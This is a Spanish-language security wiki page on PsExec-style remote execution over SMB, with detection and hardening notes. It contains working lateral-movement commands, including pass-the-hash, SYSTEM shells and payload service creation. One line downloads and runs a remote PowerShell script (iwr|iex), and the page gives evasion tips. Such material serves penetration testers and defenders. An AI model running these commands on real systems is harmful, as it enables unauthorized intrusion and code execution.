# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Cómo funcionan

Estas técnicas abusan del Windows Service Control Manager (SCM) de forma remota a través de SMB/RPC para ejecutar comandos en un host objetivo. El flujo habitual es:

1. Autenticarse en el objetivo y acceder al recurso compartido ADMIN$ mediante SMB (TCP/445).
2. Copiar un ejecutable o especificar una línea de comandos LOLBAS que ejecutará el servicio.
3. Crear un servicio remotamente mediante SCM (MS-SCMR sobre \PIPE\svcctl) que apunte a ese comando o binario.
4. Iniciar el servicio para ejecutar el payload y, opcionalmente, capturar stdin/stdout mediante un named pipe.
5. Detener el servicio y limpiar (eliminar el servicio y cualquier binario depositado).

Requisitos/prerrequisitos:
- Ser Local Administrator en el objetivo (SeCreateServicePrivilege) o tener permisos explícitos para crear servicios en el objetivo.
- SMB (445) accesible y el recurso compartido ADMIN$ disponible; Remote Service Management permitido a través del firewall del host.
- UAC Remote Restrictions: con cuentas locales, el filtrado de tokens puede bloquear a los administradores a través de la red, a menos que se utilice la cuenta integrada Administrator o LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: usar un hostname/FQDN habilita Kerberos; conectarse mediante IP suele recurrir a NTLM (y puede estar bloqueado en entornos hardened).

### ScExec/WinExec manual mediante sc.exe

A continuación se muestra un enfoque mínimo para crear un servicio. La imagen del servicio puede ser un EXE depositado o un LOLBAS como cmd.exe o powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notas:
- Espera un error de timeout al iniciar un EXE que no sea un servicio; la ejecución todavía ocurre.
- Para mantener una mejor OPSEC, prefiere comandos fileless (`cmd /c`, `powershell -enc`) o elimina los artefactos dejados.

Encuentra pasos más detallados en: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Herramientas y ejemplos

### Sysinternals PsExec.exe

- Herramienta de administración clásica que utiliza SMB para dejar PSEXESVC.exe en ADMIN$, instala un servicio temporal (nombre predeterminado: PSEXESVC) y hace proxy de la E/S mediante named pipes.
- Ejemplos de uso:<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Puedes ejecutarlo directamente desde Sysinternals Live mediante WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Deja eventos de instalación/desinstalación de servicios (el nombre del servicio suele ser PSEXESVC, a menos que se use -r) y crea C:\Windows\PSEXESVC.exe durante la ejecución.

### Impacket psexec.py (similar a PsExec)

- Utiliza un servicio similar a RemCom integrado. Deposita un binario de servicio transitorio (normalmente con un nombre aleatorio) mediante ADMIN$, crea un servicio (por defecto, a menudo RemComSvc) y retransmite la E/S a través de una named pipe.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artefactos
- EXE temporal en C:\Windows\ (8 caracteres aleatorios). El nombre del servicio es RemComSvc de forma predeterminada, salvo que se sobrescriba.

### Impacket smbexec.py (SMBExec)

- Crea un servicio temporal que inicia cmd.exe y utiliza una named pipe para la E/S. Generalmente evita dejar un payload EXE completo; la ejecución de comandos es semi-interactiva.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementa varios métodos de lateral movement, incluido service-based exec.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) incluye la modificación/creación de servicios para ejecutar un comando de forma remota.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- También puedes utilizar CrackMapExec para ejecutar mediante distintos backends (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, detección y artefactos

Artefactos típicos del host/red al usar técnicas similares a PsExec:
- Security 4624 (Logon Type 3) y 4672 (Special Privileges) en el objetivo para la cuenta de administrador utilizada.
- Security 5140/5145 File Share y File Share Detailed, mostrando el acceso a ADMIN$ y la creación/escritura de service binaries (por ejemplo, PSEXESVC.exe o un archivo .exe aleatorio de 8 caracteres).
- Security 7045 Service Install en el objetivo: nombres de servicios como PSEXESVC, RemComSvc o personalizados (-r / -service-name).
- Sysmon 1 (Process Create) para services.exe o la service image, 3 (Network Connect), 11 (File Create) en C:\Windows\, 17/18 (Pipe Created/Connected) para pipes como \\.\pipe\psexesvc, \\.\pipe\remcom_* o equivalentes aleatorizados.
- Artefacto del registro para el EULA de Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 en el host del operador (si no se suprime).

Ideas para hunting
- Generar alertas sobre instalaciones de servicios donde ImagePath incluya cmd.exe /c, powershell.exe o ubicaciones TEMP.
- Buscar creaciones de procesos donde ParentImage sea C:\Windows\PSEXESVC.exe o procesos hijos de services.exe ejecutándose como LOCAL SYSTEM y ejecutando shells.
- Marcar named pipes que terminen en -stdin/-stdout/-stderr o nombres de pipes conocidos de clones de PsExec.

## Solución de fallos comunes
- Access is denied (5) al crear servicios: no se es realmente administrador local, existen restricciones UAC remotas para cuentas locales o hay protección contra manipulación de EDR en la ruta del service binary.
- The network path was not found (53) o no se pudo conectar a ADMIN$: el firewall bloquea SMB/RPC o los admin shares están deshabilitados.
- Kerberos falla pero NTLM está bloqueado: conectarse usando el hostname/FQDN (no la IP), asegurarse de que los SPN sean correctos o proporcionar -k/-no-pass con tickets al usar Impacket.
- El inicio del servicio agota el tiempo de espera, pero el payload se ejecutó: es lo esperado si no es un service binary real; capturar la salida en un archivo o usar smbexec para obtener I/O en directo.

## Notas de hardening
- Windows 11 24H2 y Windows Server 2025 requieren SMB signing de forma predeterminada para las conexiones salientes (y las conexiones entrantes en Windows 11). Esto no rompe el uso legítimo de PsExec con credenciales válidas, pero evita el abuso de SMB relay sin firma y puede afectar a dispositivos que no admitan signing.<sup>[[2]](#references)</sup>
- El nuevo bloqueo de NTLM del cliente SMB (Windows 11 24H2/Server 2025) puede impedir el fallback a NTLM al conectarse mediante IP o a servidores que no usen Kerberos. En entornos hardened esto romperá PsExec/SMBExec basados en NTLM; usar Kerberos (hostname/FQDN) o configurar excepciones si es legítimamente necesario.<sup>[[2]](#references)</sup>
- Principio de mínimo privilegio: minimizar la pertenencia al grupo de administradores locales, preferir Just-in-Time/Just-Enough Admin, aplicar LAPS y monitorizar/generar alertas sobre las instalaciones de servicios 7045.

## Véase también

- WMI-based remote exec (a menudo más fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-based remote exec:

{{#ref}}
./winrm.md
{{#endref}}

## Referencias

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
